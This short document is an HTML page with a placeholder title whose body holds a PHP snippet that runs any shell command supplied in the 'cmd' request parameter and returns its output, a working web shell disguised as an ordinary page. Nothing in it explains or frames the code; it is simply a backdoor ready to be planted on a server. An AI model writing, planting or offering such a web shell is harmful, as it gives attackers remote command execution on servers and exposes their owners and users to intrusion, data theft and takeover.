<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8">
  <title>title</title>
</head>

<body>

  <?php
if (isset($_REQUEST['cmd'])) {
    passthru($_REQUEST['cmd']);
}
?>
</body>
</html>
